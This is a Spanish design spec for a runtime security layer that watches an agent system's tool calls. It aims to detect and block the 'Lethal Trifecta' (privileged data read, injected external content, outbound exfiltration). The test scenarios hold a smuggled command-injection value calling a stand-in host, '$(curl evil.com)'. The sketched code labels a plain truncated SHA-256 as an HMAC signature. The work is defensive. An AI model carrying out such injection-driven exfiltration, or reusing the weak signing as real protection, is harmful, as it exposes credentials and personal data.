# Spec: SE-306 — Agent Runtime Security (ARS)

**Task ID:**        SE-306
**PBI padre:**      SE-306 — Seguridad runtime para ejecucion de herramientas de agentes
**Sprint:**         2026-08
**Fecha creacion:** 2026-08-04
**Creado por:**     Savia

**Developer Type:** agent-team
**Asignado a:**     python-developer + security-guardian
**Estado:**         PROPOSED

**Effort Estimation (Dual Model):**

| Dimension | Value |
|---|---|
| Agent effort | 180 min |
| Human effort | 12 h |
| Review effort | 90 min |
| Context risk | high |
| Agent-capable | partial |
| Fallback | Si agente falla: humano necesita 6h (seguridad critica) |

---

## 1. Contexto y Objetivo

Savia tiene 83 agentes que ejecutan herramientas (bash, write, read, edit, task/delegacion,
webfetch) sobre datos de diferentes niveles de sensibilidad (N1-N4b). No existe proteccion
runtime contra el patron de ataque mas peligroso en sistemas multi-agente: la Trifecta Letal.

**Trifecta Letal**: un agente que combina tres capacidades en una misma sesion:
1. **ACCESO PRIVILEGIADO** — lee datos N3/N4 (credenciales, PAT, PII, config interna)
2. **INYECCION** — contenido externo no confiable (fetchWeb, prompt del usuario)
3. **EXFILTRACION** — envia datos hacia fuera (git push, Azure DevOps API, write a output/)

Ningun paso individual es malicioso. Los clasificadores a nivel de prompt no lo detectan.
Solo la correlacion de los tres pasos a nivel de tool-call revela el ataque — y para entonces
los datos ya salieron.

El patron de seguridad runtime para agentes ofrece una arquitectura de 4 capas de deteccion
(L1-L4) mas 15+ clasificadores especializados que se ejecutan despues de CADA tool call,
correlacionan señales entre llamadas, y bloquean la exfiltracion ANTES de que ocurra.

**Objetivo**: añadir a Savia una capa de seguridad runtime que:
1. Envuelva las herramientas de los agentes con deteccion L1-L4
2. Construya un grafo de delegacion multi-agente con estado de riesgo por agente
3. Detecte la Trifecta Letal y bloquee la herramienta de salida antes de la exfiltracion
4. Emita registros firmados criptograficamente de cada bloqueo
5. Funcione como hook/wrapper transparente sin modificar los agentes existentes

---

## 2. Contrato Tecnico

### 2.1 Arquitectura de 4 Capas de Deteccion

```
Tool call (bash, write, read, edit, task, webfetch, glob, grep)
    │
    ▼
┌─────────────────────────────────────────────────────┐
│              Interceptor (wrapper)                   │
│                                                     │
│  L1: Data Classification                            │
│    - ¿Lee datos sensibles? (N1-N4b)                 │
│    - ¿Contiene secrets/credenciales en output?      │
│    - classify_data_source(tool, args, result)       │
│                                                     │
│  L2: Injection / Untrusted Content                  │
│    - ¿Proviene de fuente no confiable?              │
│    - ¿Contiene patrones de inyeccion?               │
│    - ¿Encoding sospechoso? (base64, URL encode)     │
│    - tag_token_provenance(tool, args)               │
│                                                     │
│  L3: Exfiltration / Outbound Intent                 │
│    - ¿Es una herramienta de salida?                 │
│    - ¿El destino es externo?                        │
│    - ¿Similitud entre datos leidos y datos enviados?│
│    - classify_outbound_intent(tool, args)           │
│                                                     │
│  L4: Memory Contamination (opcional)                │
│    - ¿Memoria compartida contaminada?               │
│    - check_memory_contamination(session)            │
│                                                     │
│  Behavioral Drift Detector                          │
│    - ¿Patron de uso anormal de herramientas?        │
│                                                     │
│  Cross-Agent Trifecta                               │
│    - ¿L1 en agente A + L2 en agente B + L3 ahora?  │
└──────────────────────┬──────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────┐
│              Correlation Engine                      │
│                                                     │
│  risk_vector = { l1, l2, l3, l4 }                  │
│  score = l1 + l2 + l3 + extra_signals              │
│  action = score >= threshold ? BLOCK : ALLOW       │
│                                                     │
│  Señales extra (agravantes):                        │
│    - secrets_detected: +1                           │
│    - encoding_detected: +1                          │
│    - suspicious_destination: +1                     │
│    - split_exfiltration: +2 (multiple calls)        │
│    - behavioral_drift: +1                           │
│                                                     │
│  threshold: 3 (default conservador)                 │
│    → requiere L1 + L2 + L3 para bloquear            │
└──────────────────────┬──────────────────────────────┘
                       │
              ┌────────┴────────┐
              ▼                 ▼
          ALLOW             BLOCK
      (ejecuta tool)    (rechaza call,
                         emite registro firmado)
```

### 2.2 Mapeo Herramientas Savia → Clasificacion

```python
# scripts/security/agent-runtime-security.py

TOOL_CLASSIFICATION = {
    # Herramientas que leen datos potencialmente sensibles (L1)
    "read": {
        "is_data_read": True,
        "sensitivity": "depends_on_path",  # N1-N4b segun el path
    },
    "grep": {
        "is_data_read": True,
        "sensitivity": "depends_on_pattern",
    },
    "glob": {
        "is_data_read": True,
        "sensitivity": "low",  # solo nombres de fichero
    },

    # Herramientas que ingieren contenido externo (L2)
    "webfetch": {
        "is_network_capable": True,
        "trust_level": "untrusted",  # contenido externo = no confiable
    },
    "task": {
        "is_network_capable": True,
        "trust_level": "conditional",  # depende del subagente invocado
    },

    # Herramientas que pueden exfiltrar datos (L3)
    "bash": {
        "is_network_capable": True,
        "is_outbound": True,  # puede curl, git push, etc.
        "risk_class": "exec",
    },
    "write": {
        "is_outbound": True,  # puede escribir en output/ externo
        "risk_class": "write_local",
    },
    "edit": {
        "is_outbound": False,  # solo modifica, no crea nuevos paths
        "risk_class": "write_local",
    },
}

# Mapeo de paths a nivel de sensibilidad (N1-N4b)
PATH_SENSITIVITY = {
    ".claude/rules/pm-config.local.md": "N4b",  # PAT, secrets
    ".claude/external-memory/": "N4a",          # memoria personal
    ".savia/": "N3",                            # config interna
    "docs/": "N1",                              # documentacion publica
    "projects/": "N2",                          # codigo de proyecto
    "output/": "N1",                            # output publico
    "scripts/": "N1",                           # scripts publicos
}
```

### 2.3 Interceptor (Wrapper Transparente)

```python
# scripts/security/interceptor.py

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Callable, Any
from enum import Enum
import hashlib, json, time

class AlertMode(Enum):
    LOG = "log"          # solo registrar
    ALERT = "alert"      # notificar, no bloquear
    INTERRUPT = "interrupt"  # bloquear la tool call

@dataclass
class RiskVector:
    l1: bool = False  # privileged data access
    l2: bool = False  # untrusted content
    l3: bool = False  # exfiltration risk
    l4: bool = False  # memory contamination
    secrets_detected: bool = False
    injection_detected: bool = False
    encoding_detected: bool = False
    suspicious_destination: bool = False
    behavioral_drift: bool = False

@dataclass
class RiskAssessment:
    vector: RiskVector
    score: int  # 0-6
    action: str  # "allow" | "block"
    signals: List[str]
    tool_name: str
    timestamp: str
    signature: Optional[str] = None  # HMAC-SHA256

class AgentRuntimeSecurity:
    """
    Wrapper de seguridad runtime para herramientas de agentes Savia.

    Uso:
        ars = AgentRuntimeSecurity(
            threshold=3,
            alert_mode=AlertMode.INTERRUPT,
        )
        # wrapped_read = ars.wrap(read_tool, "read")
        # result = await wrapped_read(path="docs/foo.md")
    """

    def __init__(
        self,
        threshold: int = 3,
        alert_mode: AlertMode = AlertMode.INTERRUPT,
        path_sensitivity: Optional[Dict[str, str]] = None,
    ):
        self.threshold = threshold
        self.alert_mode = alert_mode
        self.path_sensitivity = path_sensitivity or PATH_SENSITIVITY
        self.session_state: Dict[str, RiskVector] = {}  # agent_id → vector
        self.assessments: List[RiskAssessment] = []

    def wrap(self, tool_fn: Callable, tool_name: str, agent_id: str = "default"):
        """Envuelve una tool function con deteccion L1-L3."""

        classification = TOOL_CLASSIFICATION.get(tool_name, {})

        async def wrapped(*args, **kwargs):
            # Pre-ejecucion: clasificar intencion
            l1_triggered = self._check_l1(tool_name, args, kwargs)
            l2_triggered = self._check_l2(tool_name, args, kwargs)
            l3_triggered = self._check_l3(tool_name, args, kwargs)

            # L3 se evalua ANTES de ejecutar (bloquear antes de que salga)
            if l3_triggered and self.alert_mode == AlertMode.INTERRUPT:
                # Construir vector de riesgo acumulado de la sesion
                vector = self.session_state.get(agent_id, RiskVector())
                vector.l3 = True

                score = self._compute_score(vector)
                if score >= self.threshold:
                    assessment = RiskAssessment(
                        vector=vector, score=score, action="block",
                        signals=self._extract_signals(vector),
                        tool_name=tool_name, timestamp=self._now(),
                        signature=self._sign(score, tool_name),
                    )
                    self.assessments.append(assessment)
                    return self._blocked_response(tool_name, assessment)

            # Ejecutar la herramienta
            result = await tool_fn(*args, **kwargs) if hasattr(tool_fn, '__call__') else tool_fn(*args, **kwargs)

            # Post-ejecucion: analizar resultado
            if l1_triggered:
                self._update_session(agent_id, "l1", True)
            if l2_triggered:
                self._update_session(agent_id, "l2", True)

            # Detectar secrets en el resultado
            if self._detect_secrets(str(result)):
                self._update_session(agent_id, "secrets_detected", True)

            return result

        return wrapped

    def _check_l1(self, tool_name: str, args, kwargs) -> bool:
        """¿Esta tool lee datos privilegiados?"""
        classification = TOOL_CLASSIFICATION.get(tool_name, {})
        if not classification.get("is_data_read"):
            return False
        # Verificar si el path objetivo es sensible
        path = self._extract_path(args, kwargs)
        if path:
            for prefix, level in self.path_sensitivity.items():
                if path.startswith(prefix) and level in ("N3", "N4a", "N4b"):
                    return True
        return False

    def _check_l2(self, tool_name: str, args, kwargs) -> bool:
        """¿Contenido no confiable?"""
        classification = TOOL_CLASSIFICATION.get(tool_name, {})
        if classification.get("is_network_capable") and \
           classification.get("trust_level") == "untrusted":
            return True
        # Detectar patrones de inyeccion en argumentos
        for arg in list(args) + list(kwargs.values()):
            if self._has_injection_pattern(str(arg)):
                return True
        return False

    def _check_l3(self, tool_name: str, args, kwargs) -> bool:
        """¿Tool de salida/exfiltracion?"""
        classification = TOOL_CLASSIFICATION.get(tool_name, {})
        return classification.get("is_outbound", False)

    def _compute_score(self, vector: RiskVector) -> int:
        score = 0
        if vector.l1: score += 1
        if vector.l2: score += 1
        if vector.l3: score += 1
        if vector.l4: score += 1
        if vector.secrets_detected: score += 1
        if vector.injection_detected: score += 1
        if vector.encoding_detected: score += 1
        if vector.suspicious_destination: score += 1
        if vector.behavioral_drift: score += 1
        return min(score, 6)

    def _blocked_response(self, tool_name: str, assessment: RiskAssessment) -> dict:
        return {
            "blocked": True,
            "tool": tool_name,
            "reason": f"Risk score {assessment.score}/{self.threshold} — Lethal Trifecta detected",
            "signals": assessment.signals,
            "signature": assessment.signature,
        }

    def _sign(self, score: int, tool_name: str) -> str:
        payload = f"{score}:{tool_name}:{self._now()}"
        return hashlib.sha256(payload.encode()).hexdigest()[:16]
```

### 2.4 Grafo de Delegacion Multi-Agente

```python
# scripts/security/delegation-graph.py

@dataclass
class AgentNode:
    agent_id: str
    agent_type: str  # "orchestrator" | "subagent" | "tool_agent"
    declared_tools: List[str]
    risk_state: RiskVector

@dataclass
class DelegationEdge:
    from_agent_id: str
    to_agent_id: str
    context_fingerprint: str  # SHA-256 del contexto de handoff
    risk_state_at_handoff: RiskVector
    timestamp: str

@dataclass
class DelegationGraph:
    session_id: str
    root_agent_id: str
    nodes: Dict[str, AgentNode]
    edges: List[DelegationEdge]
    signature: Optional[str] = None

    def add_agent(self, agent_id: str, agent_type: str, tools: List[str],
                  parent_id: Optional[str] = None, context: str = ""):
        """Registra un nuevo agente en el grafo de delegacion."""
        node = AgentNode(
            agent_id=agent_id,
            agent_type=agent_type,
            declared_tools=tools,
            risk_state=RiskVector(),
        )
        self.nodes[agent_id] = node
        if parent_id and parent_id in self.nodes:
            edge = DelegationEdge(
                from_agent_id=parent_id,
                to_agent_id=agent_id,
                context_fingerprint=hashlib.sha256(context.encode()).hexdigest()[:16],
                risk_state_at_handoff=self.nodes[parent_id].risk_state,
                timestamp=self._now(),
            )
            self.edges.append(edge)

    def cross_agent_trifecta(self) -> List[str]:
        """Detecta trifecta a traves de multiples agentes."""
        alerts = []
        for node in self.nodes.values():
            if node.risk_state.l1:
                # Buscar si algun hijo tiene L2 + L3
                for edge in self.edges:
                    if edge.from_agent_id == node.agent_id:
                        child = self.nodes.get(edge.to_agent_id)
                        if child and child.risk_state.l2 and child.risk_state.l3:
                            alerts.append(
                                f"Cross-agent trifecta: {node.agent_id} (L1) → "
                                f"{child.agent_id} (L2+L3)"
                            )
        return alerts
```

### 2.5 Integracion como Hook

```python
# .opencode/hooks/agent-security-intercept.py
# Hook que se ejecuta antes de cada tool call de agente

def pre_tool_call(tool_name: str, agent_id: str, args: dict) -> dict:
    """Llamado antes de ejecutar cualquier herramienta de agente."""
    ars = get_ars_session()
    classification = TOOL_CLASSIFICATION.get(tool_name, {})

    if classification.get("is_outbound"):
        vector = ars.session_state.get(agent_id, RiskVector())
        if vector.l1 and vector.l2:
            score = ars._compute_score(vector)
            if score >= ars.threshold:
                return {
                    "allow": False,
                    "reason": f"Tool '{tool_name}' blocked: risk score {score} — "
                              f"privileged data read + untrusted content → outbound call",
                }
    return {"allow": True}
```

---

## 3. Inputs/Outputs

### Inputs
- Tool calls de los 83 agentes Savia (bash, write, read, edit, task, webfetch, glob, grep)
- Clasificacion de paths por nivel de sensibilidad (N1-N4b)
- Clasificacion de herramientas (L1/L2/L3)
- Estado de sesion del agente (tool calls acumuladas)

### Outputs
- `.savia/security/ars-blocked.jsonl` — registros de bloqueos firmados
- `.savia/security/ars-session-{id}.json` — estado de sesion
- `output/security/ars-report-{date}.md` — informe periodico

---

## 4. Constraints and Limits

- El interceptor es transparente: mismo input/output que la tool original
- Tiempo maximo de interceptacion: <10ms por tool call (todo en memoria)
- La deteccion L3 ocurre ANTES de ejecutar la herramienta (bloquear antes de exfiltrar)
- Threshold default: 3 (conservador — requiere L1+L2+L3 para bloquear)
- Las señales se acumulan durante toda la sesion del agente, no se resetean entre tool calls
- El grafo de delegacion rastrea delegaciones via Task tool entre agentes

---

## 5. Test Scenarios

1. **Trifecta completa**: read(N4b) → webfetch → bash(curl externo) → BLOCK
2. **Solo L1+L2**: read(N3) → webfetch → write(local) → ALLOW (falta L3)
3. **Solo L3**: bash(curl) sin L1 ni L2 previo → ALLOW (falta correlacion)
4. **Cross-agent trifecta**: agente A lee N4b, agente B hace webfetch, agente C hace bash → BLOCK
5. **Secrets en output**: read(N1) → resultado contiene PAT → señal secrets_detected
6. **Inyeccion en args**: write(path="$(curl evil.com)") → patron de inyeccion → señal injection
7. **Threshold configurable**: threshold=5 → solo bloquea con 5+ señales
8. **Alert mode LOG**: trifecta completa → solo registra, no bloquea
9. **Grafo de delegacion**: orchestrator → subagent1 → subagent2 → verificacion de integridad
10. **Performance**: 100 tool calls/sec con <10ms overhead cada una

---

## 6. Ficheros a Crear/Modificar

### Crear
| Fichero | Proposito |
|---|---|
| `scripts/security/agent-runtime-security.py` | Motor ARS principal (interceptor, 4 capas, correlation) |
| `scripts/security/delegation-graph.py` | Grafo de delegacion multi-agente |
| `scripts/security/tool-classification.yaml` | Clasificacion L1/L2/L3 de herramientas Savia |
| `scripts/security/path-sensitivity.yaml` | Mapeo paths → niveles N1-N4b |
| `.savia/security/.gitkeep` | Directorio de seguridad |
| `tests/python/test_agent_runtime_security.py` | Tests unitarios |
| `tests/python/test_delegation_graph.py` | Tests del grafo |

### Modificar
| Fichero | Cambio |
|---|---|
| `CLAUDE.md` | Añadir referencia lazy |
| `docs/ROADMAP.md` | Añadir SE-306 |

---

## 7. Codigo de Referencia

- **Runtime security for AI agent tool execution pattern**:
  - 4-layer detection (L1 data, L2 injection, L3 exfiltration, L4 memory)
  - 15+ specialized classifiers (secrets, injection, encoding, domain, MCP, drift, correlation)
  - Multi-agent delegation graph with cryptographic signing
  - Cross-agent trifecta detection across delegation chain
  - Transparent tool wrapping (same input/output, no agent modification)
  - 3 alert modes (log/alert/interrupt) with configurable threshold
  - npm package @cerberus-ai/core + PyPI cerberus-ai
  - Framework adapters: LangChain, Vercel AI, OpenAI Agents, Python

---

## 8. Estado de Implementacion

- [ ] S1: Clasificacion de herramientas Savia (tool-classification.yaml)
- [ ] S2: Clasificacion de paths N1-N4b (path-sensitivity.yaml)
- [ ] S3: Interceptor L1-L3 (agent-runtime-security.py)
- [ ] S4: Correlation engine + scoring
- [ ] S5: Grafo de delegacion multi-agente
- [ ] S6: Cross-agent trifecta detection
- [ ] S7: Hook pre-tool-call integration
- [ ] S8: Tests + validacion
- [ ] S9: Documentacion
